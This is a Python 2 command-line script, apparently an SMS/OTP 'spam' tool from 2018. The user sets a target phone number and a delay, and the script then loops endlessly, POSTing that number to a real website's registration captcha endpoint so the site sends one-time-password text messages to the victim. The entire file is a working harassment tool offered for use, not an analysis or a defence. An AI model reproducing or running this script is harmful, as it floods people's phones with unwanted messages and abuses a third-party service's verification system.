#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests,os,sys,time

B = '\033[44m'
M= '\033[45m'
W  = '\033[0m'
U = '\033[4m'
UB="\033[4;34m"
IG="\[\033[0;92m\]"
BG="\033[41m"
R = '\033[31m'
RST= '\033[0m'
P  = '\033[35m'

def lolcats():
	os.system("lolcat banner.txt")
	
def main():
	while True:
		a = raw_input(""+UB+"Simple"+W+" > ")
		if a == "help" or a == "HELP":
			print("\nJob Command\n===========\n")
			print("\tCommand\t\t\tDescription")
			print("\t-------\t\t\t-----------")
			print("\tSET TARGET\t\tYour Target (Ex: 62813xxxx)")
			print("\tSET DELAY\t\tDelay for send (Default 50-60)")
			#print("\tSET COUNT\t\tCount for send")
			print("\trun,spam,send\t\tSend OTP / SMS")
			print("\tcredits\t\t\tInformation Tool")
			print("\tq,logout,exit\t\tExit from tool\n")
		elif a == "SET TARGET":
			b=raw_input(""+UB+"Simple"+RST+R+" (set_target)"+W+" > ")
			print(b)
			
			
		elif a == "SET DELAY":
			c=input(""+UB+"Simple"+RST+R+" (set_delay)"+W+" > ")
			print(c)
		#elif a == "SET COUNT":
#			d=input(""+UB+"Simple"+RST+R+" (set_count)"+W+" > ")
#			no_count=d
#			count=0
#			print(no_count)
		elif a == "run" or a == "spam" or a == "send":
			while True:
				param={"phone":b,"smsType":1}
				z=requests.post('https://www.cubetv.sg/register/captcha',data=param).text
				print(z)
				time.sleep(c)
				
		elif a == "q" or a == "logout" or a == "exit":
			print(""+P+"Good bye  v(=∩_∩=)ﾌ"+W+"")
			sys.exit()
		elif a == "credits":
			print ("\n"+P+"\tRelease Date : 14-10-2018\n\tAuthor : Raflyda\n\tThanks To LOoLzeC Security and Deray"+W+"\n")
		else:
			print(""+R+"[!]"+W+" Command not found")

					
	
if __name__=="__main__":
	while True:
		lolcats()
		main()
